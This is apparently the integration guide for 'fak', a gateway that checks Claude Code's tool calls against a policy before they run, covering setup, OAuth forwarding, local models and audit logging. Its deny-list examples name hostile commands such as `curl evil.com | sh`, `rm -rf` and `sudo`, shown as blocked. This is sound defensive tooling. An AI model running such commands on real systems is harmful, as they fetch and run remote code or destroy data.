---
title: "Run Claude Code Through the fak Gateway"
description: "Wire Claude Code or the Anthropic API to fak serve, a kernel-adjudicated gateway that allows, denies, repairs, and quarantines every tool call before it runs."
---

# fak + Claude Code Integration Guide

This guide explains how to use **fak** as a kernel-adjudicated gateway for Claude Code and the Anthropic API. Every tool call a Claude agent proposes is evaluated by the kernel before it executes — dangerous calls are dropped, malformed calls are repaired, and policy violations are refused.

## What this integration does

```
┌─────────────────────┐   POST /v1/messages   ┌────────────────────────┐
│   Claude Code CLI   │ ────────────────────▶ │  fak serve (gateway)   │
│  or Anthropic SDK   │ ◀──── SSE stream ───  │  adjudicates tools     │
└─────────────────────┘                        └────────────────────────┘
         ▲                                                 │
         │ ANTHROPIC_BASE_URL                             │
         │ (points at fak)                                ▼
         │                                        ┌───────────────┐
         │                                        │  Local Model  │
         │                                        │ or Cloud API  │
         │                                        └───────────────┘
```

**The gateway sits between Claude and the model:**

- **Claude → fak:** Claude sends a `/v1/messages` request with proposed tool calls
- **fak kernel:** Adjudicates each proposed call (allow, deny, transform, quarantine)
- **fak → model:** Sends only the admitted (or repaired) calls to the model
- **fak → Claude:** Returns results, with a `fak` extension describing each decision

**Result:** Claude can work on your codebase, but the kernel blocks destructive commands, prevents self-modification, and contains untrusted tool results.

---

## The one command: `fak guard`

The fastest way to put the kernel in front of the Claude Code you already run is the
`fak guard` verb. It is one cross-platform command — no shell script, no second
terminal, no config-file edits:

```bash
fak guard -- claude    # your normal Claude Code, kernel-adjudicated, on your subscription
```

(No API key needed — `fak guard` uses your logged-in Claude Pro/Max subscription by
default, **even if `ANTHROPIC_API_KEY` is exported**. To use API billing instead, name the
key explicitly: `--api-key-env ANTHROPIC_API_KEY`.)

`fak guard`:

1. Starts the gateway **in-process** on a private `127.0.0.1` port (the OS picks a free one).
2. Loads a sensible secure capability floor embedded in the binary (so it works from any
   directory — print it with `fak guard --dump-policy`, override with `--policy FILE`).
3. Injects `ANTHROPIC_BASE_URL` into the **child process only** — your shell, your
   `settings.json`, and any other `claude` in another terminal are untouched.
4. Proxies to the **real Anthropic API**: your credential (subscription OAuth by default,
   or an API key when you opt in with `--api-key-env ANTHROPIC_API_KEY`) and the
   `cache_control` prompt-cache breakpoints flow through byte-for-byte (no cost regression),
   while every tool call Claude proposes crosses the capability floor first.
5. Tears the gateway down when Claude exits and prints what the kernel decided:

```
fak guard: 131 kernel decision(s) — 121 allowed, 5 denied, 2 repaired, 0 quarantined, 3 deferred
  blocked: POLICY_BLOCK     x4
  blocked: SELF_MODIFY      x1
```

(`deferred` and `escalated` only appear when nonzero: a `deferred` is a non-blocking
admit — typically an inbound tool result let through the result-side floor — and is a
normal outcome, not an error.)

> **Your Claude Pro/Max subscription is the default — no API key needed.** When the
> upstream is Anthropic, `fak guard` uses your **subscription** unless you explicitly name
> an API key: it sources the OAuth token (from `CLAUDE_CODE_OAUTH_TOKEN`, then
> `<claude-config>/.oauth-token`, then `~/.claude/.credentials.json`) and sends it
> upstream as `Authorization: Bearer` + `anthropic-beta: oauth-2025-04-20` — the scheme
> the API accepts an `sk-ant-oat…` token under (sent as `x-api-key` it 401s). So
> `fak guard -- claude` just works on a logged-in subscription. fak holds the token and
> ignores the client's own credential (it injects a placeholder key into the child). A
> bare `ANTHROPIC_API_KEY` exported in your shell **no longer** switches this — a global
> SDK key must not silently bill your API account when you hold a subscription; guard
> prints a one-line note when it holds the subscription token past an ambient key.
>
> - **Long-running / headless:** prefer a `claude setup-token` (a long-lived token, read
>   from `<claude-config>/.oauth-token` or `CLAUDE_CODE_OAUTH_TOKEN`) — the interactive
>   `~/.claude/.credentials.json` token expires and Claude Code refreshes it out-of-band.
> - **Use API billing instead:** opt in explicitly with `--api-key-env ANTHROPIC_API_KEY`
>   (fak forwards it as `x-api-key`). `--anthropic-oauth` forces the subscription path and
>   fails loud if no token is found.

Wrap a different agent or upstream by naming it after `--` and switching the provider:

```bash
fak guard --provider openai -- codex            # an OpenAI-compatible coding agent
fak guard --policy my-floor.json -- claude      # enforce your own reviewed allow-list
```

### Local model: no key, no network, one command

`fak guard --gguf` runs a local GGUF model in-kernel as the upstream for your agent. No API key, no network, no second terminal — the whole stack (local model + your harness + kernel floor) is one command:

```bash
fak guard --gguf qwen2.5:7b -- claude
```

What you'll see on first run (the GGUF is cached locally after the first pull):

```
fak guard: --gguf qwen2.5:7b → hf://bartowski/Qwen2.5-7B-Instruct-GGUF/Qwen2.5-7B-Instruct-Q4_K_M.gguf
GET https://huggingface.co/bartowski/Qwen2.5-7B-Instruct-GGUF/resolve/main/Qwen2.5-7B-Instruct-Q4_K_M.gguf
fak guard: listening on http://127.0.0.1:54321 (in-process gateway)
fak guard: loading in-kernel model: Qwen2.5-7B-Instruct-Q4_K_M.gguf
fak guard: Claude child started (PID 12345)
[... Claude session runs with the local model ...]
fak guard: 23 kernel decision(s) — 19 allowed, 2 denied, 0 repaired, 0 quarantined, 2 deferred
  blocked: POLICY_BLOCK     x2
```

**What happens:**

1. The GGUF model downloads from Hugging Face on first run (~5 GB, cached in `~/.cache/fak-models/`).
2. fak loads the model in-kernel (no separate server process).
3. Claude Code connects to the in-process gateway over `http://127.0.0.1:<random-port>/v1`.
4. Every tool call Claude proposes crosses the same kernel adjudication floor as the proxy path.
5. Your data never leaves your box — no network traffic after the initial GGUF pull.

**Model aliases:**

The `--gguf` flag accepts a model alias (from `fak ls`), an `hf://` URI, or a local `.gguf` path:

```bash
fak ls    # list available aliases: qwen2.5:7b, qwen2.5:1.5b, smollm2, ornith:9b
fak guard --gguf qwen2.5:1.5b -- claude               # smaller 1.5B model (~1.6 GB)
fak guard --gguf <path/to/model.gguf> -- claude      # local file
fak guard --gguf hf://owner/repo/model.gguf -- claude # download on demand
```

**GPU acceleration (optional):**

Use `--backend cuda` or `--backend metal` to run decode on GPU (CUDA requires `-tags cuda`; Metal is linked on darwin/arm64 with cgo):

```bash
FAK_GGUF_LOAD_WORKERS=8 fak guard --gguf qwen2.5:7b --backend cuda -- claude
```

**The honest fence:**

Small-model agentic quality is a ramp. `qwen2.5:7b` (or any 7B-class local model) can answer well-formed questions and follow simple instructions, but for complex coding tasks, frontier-quality reasoning, or multi-step refactoring, the proxy path (`fak guard -- claude`, which reaches Claude Sonnet/Opus via Anthropic's API) is still the default. Use `--gguf` for:
- Offline development on air-gapped systems
- Privacy-sensitive work where data cannot leave the box
- Testing the kernel floor without API costs
- Learning how local agentic models behave

When you need the best coding quality and you have a subscription, use `fak guard -- claude` (proxy).

### Long-context reset budget

`fak guard` can also seed a stable served-session budget for wrapped Claude Code:

```bash
fak guard --context-budget-tokens 150000 --reset-on-budget -- claude
```

The gateway uses a stable default trace id (`guard`) for child requests that do not send
`X-Trace-Id`, then debits the normalized provider context usage after each served turn
(`input_tokens` plus Anthropic cache read/write counters). With `--reset-on-budget`, when
the budget is exhausted the gateway mints a continuation id, distills the refused
transcript into a carryover seed, re-arms the continuation trace with a fresh 150k budget,
and retries the live request under that new trace.

Without `--reset-on-budget`, the session moves to draining and the next request receives
`409` with the normal `error` envelope plus `session.continuation_id` and a `reset`
directive:
`restart_fresh_session`, dump the session image, start a fresh process, rehydrate the
planned view, and reuse provider cache only where legal.

For a hard child-process boundary, use the guard restart supervisor:

```bash
fak guard --context-budget-tokens 150000 --restart-on-budget -- claude
```

On budget exhaustion, guard distills the served transcript into a carryover seed, re-arms
the continuation trace, writes a seed JSON file, advances the default trace for omitted
trace headers, stops the child, and relaunches it with `FAK_RESET_TRACE_ID`,
`FAK_SESSION_ID`, and `FAK_RESET_SEED_FILE`. Use `--restart-limit N` to cap relaunches and
`--restart-seed-dir DIR` to choose the seed-file directory. Plain `claude` does not
automatically read fak's seed file; wrapper-aware launchers can use
`FAK_RESET_SEED_FILE` to prepend the carryover seed into the fresh Claude session.

For a cooperative MCP wrapper, use `fak_session_reset` instead of waiting for a proxied
request boundary. Pass the trace id, the wrapper's observed `context_tokens`, and the
messages to distill; fak debits the budget, accepts only a budget-drained session, and
returns `seed_messages` plus the fresh continuation trace for the new Claude window.

### Deny-all auto-continue (no false stops)

When the capability floor refuses **every** tool call in a turn (a single `rm -rf`, an
unknown tool, or a whole batch all denied), the gateway must report `stop_reason: end_turn`
to the client — if it reported `tool_use` with no `tool_use` block, Claude Code would hang
hunting for a tool that was dropped. But `end_turn` tells the harness the assistant is
**done**, so the agent loop **stops** and yields to you — even though the model wanted to
act and was simply blocked. In an autonomous or `-p` run that is a **false stop**: the task
is abandoned at the first refusal, and the model never gets to read fak's own
`[fak] refused … choose an allowed alternative` note (it lands on a turn that already ended).

`fak guard` fixes this in two layers — the wire stays correct, the harness keeps moving:

1. **It's counted.** Every deny-all turn increments `fak_guard_deny_all_stops_total` and the
   live `fak_guard_deny_all_consecutive` gauge on `/metrics`, and the exit summary prints a
   `deny-all stops — N turn(s) …` line. So the otherwise-invisible "fak ended the turn" is
   legible whether or not you act on it.
2. **It's auto-resumed.** guard installs a Claude Code **`Stop` hook** that reads that gauge
   and, when the last turn was a deny-all, **blocks the stop and re-prompts the agent** with
   *"pick an allowed alternative and continue"* — so the loop keeps going instead of halting.
   It is **on by default** (`--deny-all-continue=enforce`) and **bounded**
   (`--deny-all-max`, default 3 consecutive continues) so a model that keeps re-proposing a
   refused call cannot loop forever; once the model does something allowed, the counter
   resets and the next real completion stops normally.

```bash
fak guard -- claude                          # auto-continue ON (enforce), max 3
fak guard --deny-all-continue=shadow -- claude   # log the would-continue, still stop (observe first)
fak guard --deny-all-continue=off -- claude      # restore the bare end_turn stop
fak guard --deny-all-max 5 -- claude             # allow up to 5 consecutive auto-continues
```

The Stop hook is merged into the **same** `--settings` file as the PreCompact hook (a single
`--settings` carries both), is fail-open (an unreachable gateway never wedges the agent), and
applies to **Claude children only**. Caveat: it hooks the **main** agent's `Stop` event; a
deny-all inside a `Task` subagent ends on `SubagentStop`, which is not yet auto-resumed.

### OpenCode

[OpenCode](https://opencode.ai) speaks the OpenAI-compatible wire, so guard fronts it the
same way — over `--provider openai`:

```bash
export OPENAI_API_KEY=sk-...                       # or point --base-url at a local model
fak guard --provider openai --api-key-env OPENAI_API_KEY -- opencode
```

guard injects `OPENAI_BASE_URL=http://127.0.0.1:<port>/v1` into OpenCode (the `/v1` matters
— OpenAI-compatible clients append `/chat/completions`, so a bare host 404s). OpenCode's
built-in tools are **lowercase** (`bash`, `read`, `write`, `edit`, `grep`, `glob`,
`webfetch`, …), and the built-in floor already allows them and gates them the same as
Claude Code's: a `bash` command of `rm -rf` is denied (the destructive-command rules match
the tool name case-insensitively), and a `write`/`edit` into `.git/`, `.ssh/`, or a
credential path is refused as `SELF_MODIFY` (the floor reads OpenCode's camelCase
`filePath` argument, not only `file_path`).

If OpenCode does not pick up `OPENAI_BASE_URL` in your setup, bind a **fixed** port and
point an `opencode.json` provider at it instead — same kernel boundary, explicit wiring:

```bash
fak guard --provider openai --addr 127.0.0.1:8137 --api-key-env OPENAI_API_KEY -- opencode
```

```json
{
  "$schema": "https://opencode.ai/config.json",
  "provider": {
    "fak": {
      "npm": "@ai-sdk/openai-compatible",
      "name": "fak (kernel-adjudicated)",
      "options": { "baseURL": "http://127.0.0.1:8137/v1" },
      "models": { "your-model-id": { "name": "Your Model" } }
    }
  }
}
```

### Observability

**The observable debug layer is on by default.** `fak guard` prints one compact,
payload-free line per served turn to stderr whose first job is to answer **"did this turn
work?"** at a glance:

```
fak-turn trace=guard ok prov=20.7k tok (95% of prompt) fak=0 tok cache=healthy_cache compact=none finish=end_turn
```

Read it left to right:

- **`ok`** — the one-word turn verdict: `ok` (a proven net saving on a healthy session),
  `warming` (cache activity but no net saving yet — a cold write the later reads haven't
  repaid), `degraded` (the prefix is decaying/stale or a reset is recommended), or `cold`
  (no cache activity this turn).
- **`prov=20.7k tok (95% of prompt)`** — the provider prompt-cache **NET**
  token-equivalent saving this turn: the cache-read rebate **minus** the cache-write
  premium, so a cold-write turn honestly reads a **negative** provider saving until
  later reads repay it. This is OBSERVED/provider-relayed, not fak-authored.
- **`fak=0 tok`** — fak-authored token savings this turn. This is the WITNESSED slice:
  compaction shed and in-kernel KV-prefix reuse. vDSO is reported as avoided calls,
  not token-equivalents, until there is a token witness for a skipped call.
- **`cache=healthy_cache`** — the rolling resetScore health; **`compact`** — the
  history-compaction action (`none`/`fired`).

Silence it with `--debug-stats=false`, or with `--quiet` (which also drops the banner + exit
summary).

The raw provider counters (`cache_read`, `cache_creation`, `request_tokens`, `cache_hit`)
are deliberately **off** this glanceable line — they measure Anthropic's cache, not whether
fak is doing its job. They remain available for deep debugging in the JSON `--log` and on
`/metrics`, where every count is read from the same accumulators, so the views never
disagree:

- **per-turn debug line** (default **ON**) — the `fak-turn …` line above, one per served
  turn on stderr: a verdict, `prov=` provider prompt-cache token-equiv, `fak=`
  fak-authored token-equiv, the `cache` health, and the `compact` action. No payload,
  ever. `--debug-stats=false` or `--quiet` to silence.
- **`--log FILE`** (or `--log -` for stderr) streams every per-request and per-verdict
  line — `event=gateway_http_request` and `event=gateway_operation`, each carrying the
  `trace_id` that ties the request, its verdicts, and the metrics together.
- **`FAK_AUDIT_JOURNAL=/path/audit.jsonl`** writes a durable, **hash-chained,
  tamper-evident** row for every kernel decision that survives the session — the audit
  trail of record. Each row is
  `{"seq","kind":"DECIDE","tool","trace_id","verdict","reason","by","args_digest","prev_hash","hash","witness"}`;
  an auditor re-verifies the chain to prove no row was dropped or altered.
- **Live scrape** while the session runs, on the gateway URL the banner prints (the
  loopback default is unauthenticated): `GET /metrics` (Prometheus — verdict counters,
  HTTP latency, kernel counters, vDSO hit ratio), `GET /debug/vars` (expvar JSON),
  `GET /v1/fak/events` (drain the journal tail after a `?since=` cursor).
- **On exit**, the one-line summary: allowed / denied / repaired / quarantined with a
  per-reason breakdown.

```bash
FAK_AUDIT_JOURNAL=~/fak-audit.jsonl fak guard --log ~/fak-gw.log -- claude
```

### Prove it: the request really transited the gateway over your subscription

You don't have to take the subscription-by-default behavior on faith. On any box with the
`claude` binary and a Claude Pro/Max subscription, this proves end to end that a real
`/v1/messages` request crossed the in-process kernel gateway and was authenticated with
your subscription OAuth token. Copy-paste it.

**Prerequisites:**

- `claude` is on your `PATH` (`claude --version` works).
- A subscription token is reachable, in the order `fak guard` reads them: the
  `CLAUDE_CODE_OAUTH_TOKEN` env var (a `claude setup-token` value), then
  `<claude-config>/.oauth-token`, then `<claude-config>/.credentials.json` (the
  interactive login token, which expires — prefer a setup token for anything
  long-running). If you have used `claude` interactively on this box, the third source
  already exists.
- `ANTHROPIC_API_KEY` is **unset**. The subscription is the default even with it set, but
  Check 3 below witnesses the **injected placeholder** key, which guard hands the child
  only when `ANTHROPIC_API_KEY` is unset — so keep it unset for this exact proof. (To
  deliberately use API billing instead, opt in with `--api-key-env ANTHROPIC_API_KEY`.)

Run one headless, machine-checkable turn from the repo root (the Go module is the repo
root), with the gateway log and the audit journal on:

```bash
go build -o fak ./cmd/fak

# --log, FAK_AUDIT_JOURNAL, and --anthropic-oauth are fak flags.
# -p, --allowedTools, and --output-format AFTER `claude` are Claude Code flags.
FAK_AUDIT_JOURNAL="$PWD/fak-audit.jsonl" \
  ./fak guard --log "$PWD/gw.log" --anthropic-oauth -- \
  claude -p "Run: echo hello-from-guard" \
    --allowedTools "Bash(echo:*)" \
    --output-format json
```

`--anthropic-oauth` is optional (it is already the default for `--provider anthropic` with
no API key); passing it makes guard fail loud if no token is found instead of silently
falling back to passthrough. The banner names the token source and ends
`…, sent as a bearer token)`.

**Check 1 — a real result came back over your subscription.** `claude … --output-format
json` writes one envelope to stdout (the banner and exit summary go to stderr, so they do
not pollute it):

```json
{ "type": "result", "is_error": false, "result": "hello-from-guard", "duration_api_ms": 1234 }
```

`"is_error": false` with a real `result` proves a turn completed against Anthropic through
guard.

**Check 2 — the request transited the gateway.** Each line in `gw.log` is a timestamped
JSON record; find the `/v1/messages` POST:

```bash
grep '"route":"/v1/messages"' gw.log
# 2026/06/23 12:00:00 {"event":"gateway_http_request","method":"POST",
#   "route":"/v1/messages","status":200,"duration_ms":1180.4,
#   "user_agent":"claude-cli/...","trace_id":"gw-3"}
```

A `200` on `route=/v1/messages` from a `claude-cli/...` user agent proves the bytes were
Claude's and they passed through the in-process gateway. Cross-check that line's
`duration_ms` against the `duration_api_ms` in the Check-1 JSON: they are the same upstream
call seen from the two ends of the proxy. If Claude had reached Anthropic directly, there
would be no `/v1/messages` line here at all.

**Check 3 — no bypass: the `200` is only possible because the gateway swapped the
credential.** When `ANTHROPIC_API_KEY` is unset, guard hands the child the **invalid**
placeholder key `fak-guard-oauth-placeholder` (`cmd/fak/guard.go`) and injects only the
gateway URL. So the child authenticates to the gateway with a key Anthropic would reject.
The upstream `200` is therefore only possible because the gateway dropped that placeholder
and authenticated upstream with your real held OAuth bearer. A direct
`claude → api.anthropic.com` call carrying that placeholder would `401`. The `200` is the
proof the swap happened.

**Check 4 — the tool call was adjudicated and recorded.** The `--allowedTools
"Bash(echo:*)"` turn asks the model to run `echo`. If the model proposes the tool call
(Haiku reliably does for this prompt), the kernel adjudicates it and the exit summary on
stderr counts it:

```
fak guard: 2 kernel decision(s) — 1 allowed, 0 denied, 0 repaired, 0 quarantined, 1 deferred
```

`allowed` is the proposed `Bash` call crossing the capability floor; `deferred` is its
inbound tool result admitted through the result-side floor. The durable record is in
`fak-audit.jsonl` — a hash-chained `DECIDE` row per decision:

```bash
grep '"verdict":"ALLOW"' fak-audit.jsonl
# {"seq":1,"kind":"DECIDE","tool":"Bash","verdict":"ALLOW","by":"monitor","prev_hash":"","hash":"..."}
```

Each row carries `prev_hash`/`hash`, so an auditor re-verifies the chain end to end and
proves no decision was dropped or altered. (If the model answers in text without calling
the tool, you get `0 allowed` and no ALLOW row — re-run, or make the instruction more
explicit.) Without `FAK_AUDIT_JOURNAL` set, the summary is in-memory only and this durable
trail does not exist.

Together: a real result (1), through the gateway (2), authenticated only because the
gateway swapped in your OAuth token (3), with the tool call adjudicated and recorded (4).

### Current limits on the subscription seat

The proof above runs the default `fak guard -- claude` path. The honest limits and
in-flight rungs on that seat:

- **Streaming.** The Anthropic `/v1/messages` wire synthesizes the SSE from a
  fully-buffered, already-adjudicated turn, so time-to-first-token equals full-generation
  time here. Live token streaming is shipped on the OpenAI-compatible wire for content;
  the Anthropic-wire rung is next.
- **Audit journal is opt-in.** The hash-chained trail exists only when `FAK_AUDIT_JOURNAL`
  is set (the proof above sets it). The in-memory exit summary is always on.
- **KV poison-eviction is a no-op on a proxy/subscription seat, by design.** The model
  lives upstream, so there is no local KV prefix to drop. A quarantined tool result is
  still paged out before the model reads it; the in-kernel evictor is the local-model
  (`--gguf`) path.
- **The OpenAI-wire seat** (`fak guard --provider openai -- codex` / `opencode`) is
  unit-tested for provider inference and the tool floor, but has no recorded live
  gateway-transited proof yet. Running the four checks above against it is the open task.

The rest of this guide covers the **local-model** dogfood path (point fak at
ollama / a shim / a large local OpenAI-compatible server) and the manual two-terminal
wiring `fak guard` automates.

---

## Quick Start (macOS/Linux)

The dogfood launcher spins up the entire stack with one command:

```bash
git clone https://github.com/anthony-chaudhary/fak && cd fak
./scripts/dogfood-claude.sh --probe "Reply with exactly the word: pong"
```

This:

1. Builds `fak`
2. Starts a local model (Ollama by default, or llama-server/LM Studio via preset)
3. Starts `fak serve` in front of it as an Anthropic Messages server
4. Points Claude Code at the gateway
5. Runs one headless turn and writes the witness to `experiments/agent-live/`

For interactive use:

```bash
./scripts/dogfood-claude.sh    # Opens interactive Claude Code on the local model
```

### Install for PATH access

```bash
./scripts/dogfood-claude.sh --install
# Now you can run from anywhere:
fak-dogfood --probe "hi"
fak-qwen36-claude --probe "hi"    # Qwen3.6 local preset
fak serve --help                  # Repo CLI from PATH
```

---

## Quick Start (Windows PowerShell)

Windows uses the native PowerShell script — same flow, no Ollama dependency:

```powershell
git clone https://github.com/anthony-chaudhary/fak; cd fak
.\scripts\dogfood-claude.ps1 --probe "say pong"
```

The Windows version:

- Uses the in-tree `local_shim.py` (transformers) instead of Ollama
- Defaults to `SmolLM2-135M` for CPU-friendly serving
- Auto-detects CUDA when available
- Auto-bumps the port if `:8080` is busy

Interactive mode:

```powershell
.\scripts\dogfood-claude.ps1
```

---

## Architecture Overview

### The three components

| Component | What it is | Who starts it |
|---|---|---|
| **Model server** | The process that generates tokens (Ollama, llama-server, LM Studio, vLLM, SGLang, or the in-tree `local_shim.py`) | You (or the dogfood script) |
| **fak serve** | The gateway that speaks Anthropic Messages API, adjudicates tool calls, and proxies to the model | `dogfood-claude.sh` or manually |
| **Claude Code** | The CLI/harness that sends agent prompts and tool calls | `dogfood-claude.sh` or manually |

### What `fak serve` exposes

| Route | Purpose |
|---|---|
| `POST /v1/messages` | Anthropic Messages API (Claude Code compatibility) |
| `POST /v1/chat/completions` | OpenAI-compatible proxy (for other clients) |
| `GET /healthz` | Health check (`{"ok":true,"model":"...","engine":"..."}`) |
| `GET /v1/models` | Advertises the served model id |
| `POST /v1/fak/syscall` | Run one adjudicated tool call (dispatch to registered engine) |
| `POST /v1/fak/adjudicate` | Get a verdict without executing |
| `POST /v1/fak/admit` | Send a tool result through the result-side floor |
| `GET /v1/fak/changes` | Cross-agent "what changed" feed (vDSO coherence) |
| `POST /v1/fak/revoke` | Revoke a poisoned witness |
| `GET /metrics` | Prometheus metrics |
| `POST /mcp` | MCP-over-HTTP |

### The kernel's adjudication

For every tool call the model proposes, the kernel evaluates:

1. **Allow-list** — is the tool named on the policy's allow-list?
2. **Argument rules** — does the argument match a deny regex? (e.g., `rm -rf`, `sudo`)
3. **Self-modify guard** — is the target path in `.git/`, `internal/kernel/`, etc.?
4. **Result quarantine** — does a tool result contain secrets or poisoned content?
5. **IFC taint** — is the trace's taint high-water mark elevated?

**Verdicts:** `ALLOW`, `DENY` (with reason), `TRANSFORM` (grammar repair), `QUARANTINE` (paged out)

---

## Manual Setup (without the dogfood script)

If you want to wire Claude Code to `fak serve` manually:

### 1. Start a model server

**Ollama (macOS/Linux):**

```bash
ollama serve &
ollama pull qwen2.5-coder:7b
```

**llama-server / LM Studio (OpenAI-compatible):**

```bash
llama-server \
  -hf lmstudio-community/Qwen3.6-27B-GGUF:Q4_K_M \
  --host 127.0.0.1 \
  --port 8131 \
  --ctx-size 32768 \
  --n-gpu-layers 99
```

Verify the server:

```bash
curl http://127.0.0.1:8131/v1/models
```

### 2. Start `fak serve`

From the repo root (the Go module is the repo root):

```bash
go build -o fak ./cmd/fak

./fak serve \
  --addr 127.0.0.1:8080 \
  --provider openai \
  --base-url http://127.0.0.1:8131/v1 \
  --model lmstudio-community/Qwen3.6-27B-GGUF:Q4_K_M \
  --policy examples/dogfood-claude-policy.json
```

Check health:

```bash
curl http://127.0.0.1:8080/healthz
# {"ok":true,"model":"lmstudio-community/Qwen3.6-27B-GGUF:Q4_K_M","engine":"inkernel"}
```

### 3. Wire Claude Code

```bash
export ANTHROPIC_BASE_URL="http://127.0.0.1:8080"
export ANTHROPIC_API_KEY="fak-local-dogfood"
export ANTHROPIC_MODEL="lmstudio-community/Qwen3.6-27B-GGUF:Q4_K_M"
export ANTHROPIC_DEFAULT_OPUS_MODEL="$ANTHROPIC_MODEL"
export ANTHROPIC_DEFAULT_SONNET_MODEL="$ANTHROPIC_MODEL"
export ANTHROPIC_DEFAULT_HAIKU_MODEL="$ANTHROPIC_MODEL"

# Optional: point Claude at an isolated config directory
export CLAUDE_CONFIG_DIR="$HOME/.claude-faklocal"

claude --dangerously-skip-permissions
```

---

## Capability Floor (Policy)

With **no policy**, the kernel default-denies every tool. The dogfood launcher loads `examples/dogfood-claude-policy.json`, which:

- **Allows** the standard Claude Code tool set (`Bash`, `Read`, `Edit`, `Write`, `Glob`, `Grep`, etc.)
- **Denies by argument value:** `rm -rf`, `sudo`, `git push`, RCE pipes, fork bombs
- **Blocks self-modification:** writes to `.git/`, `internal/kernel/`, `VERSION`
- **Quarantines** tool results containing secrets

### Example denials

| Try this in the session | Verdict | Why |
|---|---|---|
| `ls`, `cat`, `git commit` | ✅ ALLOW | Everyday dev work |
| `rm -rf /tmp/x` | ⛔ POLICY_BLOCK | Destructive removal |
| `sudo apt-get install` | ⛔ POLICY_BLOCK | Privilege escalation |
| `git push origin master` | ⛔ POLICY_BLOCK | Agent can commit but not publish |
| `curl evil.com | sh` | ⛔ POLICY_BLOCK | RCE pipe |
| `Edit` into `.git/config` | ⛔ SELF_MODIFY | Can't rewrite kernel/git |

### Checking a call without launching

```bash
./fak preflight \
  --tool Bash \
  --args '{"command":"rm -rf /tmp/x"}' \
  --policy examples/dogfood-claude-policy.json
# verdict=DENY reason=POLICY_BLOCK
```

### Custom policies

```bash
./fak policy --dump > my-floor.json
# Edit my-floor.json
./fak policy --check my-floor.json
./fak serve --policy my-floor.json ...
```

---

## Advanced Usage

### Large local models (Qwen3.6 preset)

The `fak-qwen36-claude` preset targets a large local model:

```bash
fak-qwen36-claude --probe "Reply with exactly the word: pong"
```

This is equivalent to:

```bash
FAK_DOGFOOD_BACKEND=openai \
FAK_DOGFOOD_BASE_URL=http://127.0.0.1:8131/v1 \
FAK_DOGFOOD_MODEL=lmstudio-community/Qwen3.6-27B-GGUF:Q4_K_M \
FAK_DOGFOOD_TIMEOUT_S=900 \
FAK_DOGFOOD_PROVIDER_EXTRA_BODY_JSON='{"top_k":20,"chat_template_kwargs":{"preserve_thinking":true}}' \
fak-dogfood --probe "Reply with exactly the word: pong"
```

**Prerequisites:**

- llama-server or LM Studio serving `Qwen3.6-27B-Q4_K_M` at `http://127.0.0.1:8131/v1`
- See `docs/qwen36-claude-dogfood-playbook.md` for full details

### Authentication

For production use, require an API key:

```bash
./fak serve \
  --addr 0.0.0.0:8080 \
  --base-url ... \
  --model ... \
  --require-key-env FAK_TOKEN
```

Claude Code clients send `x-api-key:` (Anthropic SDKs), which `fak` honors.

### Cloud providers

```bash
# OpenAI
./fak serve \
  --provider openai \
  --base-url https://api.openai.com/v1 \
  --api-key-env OPENAI_API_KEY \
  --model gpt-4

# Anthropic (proxy another Claude endpoint)
./fak serve \
  --provider anthropic \
  --base-url https://api.anthropic.com/v1 \
  --api-key-env ANTHROPIC_API_KEY \
  --model claude-sonnet-4-20250514
```

### Observability

**Prometheus metrics:**

```bash
curl http://127.0.0.1:8080/metrics
```

**Grafana dashboard:**

```bash
tools/grafana/up.sh
# Open http://localhost:3000 → "FAK Dogfood Slow Requests"
```

---

## Using the Anthropic API directly

The `/v1/messages` endpoint is compatible with Anthropic SDKs. Example with Python:

```python
import anthropic

client = anthropic.Anthropic(
    base_url="http://127.0.0.1:8080",   # Point at fak
    api_key="fak-local-dogfood"
)

response = client.messages.create(
    model="qwen2.5-coder:7b",
    max_tokens=1024,
    messages=[{"role": "user", "content": "List the files in this directory"}],
    tools=[{
        "type": "function",
        "function": {
            "name": "Bash",
            "description": "Run shell commands",
            "parameters": {
                "type": "object",
                "properties": {
                    "command": {"type": "string"}
                },
                "required": ["command"]
            }
        }
    }]
)
```

### The `fak` response extension

Every response includes a `_fak` extension with adjudication details:

```json
{
  "id": "msg_...",
  "type": "message",
  "content": [...],
  "stop_reason": "tool_use",
  "_fak": {
    "version": "fak/v1",
    "admissions": [
      {
        "tool": "Bash",
        "verdict": "ALLOW",
        "by": "monitor",
        "trace_id": "..."
      }
    ]
  }
}
```

---

## Environment Reference

| Variable | Purpose | Default |
|---|---|---|
| `ANTHROPIC_BASE_URL` | Points Claude Code at fak | `http://127.0.0.1:8080` |
| `ANTHROPIC_API_KEY` | Auth (loopback ignores this) | `fak-local-dogfood` |
| `CLAUDE_CONFIG_DIR` | Isolated account directory | `$HOME/.claude` |
| `ANTHROPIC_MODEL` | Model id for all tiers | Set by dogfood script |
| `API_TIMEOUT_MS` | Claude Code timeout | Raised by dogfood script |
| `FAK_DOGFOOD_PORT` | fak listen port | `8080` |
| `FAK_DOGFOOD_MODEL` | Model id | Auto-selected |
| `FAK_DOGFOOD_BACKEND` | `ollama`, `shim`, `openai` | `ollama` (macOS/Linux), `shim` (Windows) |
| `FAK_DOGFOOD_BASE_URL` | OpenAI upstream | Required for `backend=openai` |
| `FAK_DOGFOOD_TIMEOUT_S` | Planner/write timeout | `300` (ollama/shim), `900` (openai) |
| `FAK_DOGFOOD_POLICY` | Policy manifest | `examples/dogfood-claude-policy.json` |
| `FAK_DOGFOOD_ACCOUNT` | Account tag for switcher | `faklocal` |

---

## Troubleshooting

| Symptom | Fix |
|---|---|
| `fak: command not found` | Run `./scripts/dogfood-claude.sh --install` |
| Port `8080` already in use | Set `FAK_DOGFOOD_PORT=8090` |
| First request very slow (>60s) | Expected on large local models — the prompt is ~25K tokens |
| Claude exits at 60s | Set `FAK_DOGFOOD_TIMEOUT_S=900` |
| `/v1/models` fails | Fix the upstream model server first |
| `ollama not found` | Install Ollama, or use `FAK_DOGFOOD_BACKEND=shim` |
| Model says "pong" is wrong | Tiny models give weak answers — use a 7B+ model |
| `verify` errors | Check `FAK_MODEL_DIR` for in-kernel models |

### Debug logs

```bash
# Claude debug → <tmp>/fak-claude.log
export FAK_DOGFOOD_CLAUDE_DEBUG=api

# Gateway log → <tmp>/fak-serve.log
tail -f <tmp>/fak-serve.log
```

---

## Cross-references

- `fak/DOGFOOD-CLAUDE.md` — Full dogfood launcher documentation
- `fak/GETTING-STARTED.md` — fak install and run guide
- `docs/qwen36-claude-dogfood-playbook.md` — Qwen3.6 local model specifics
- `fak/POLICY.md` — Policy manifest schema
- `fak/ARCHITECTURE.md` — fak internal architecture
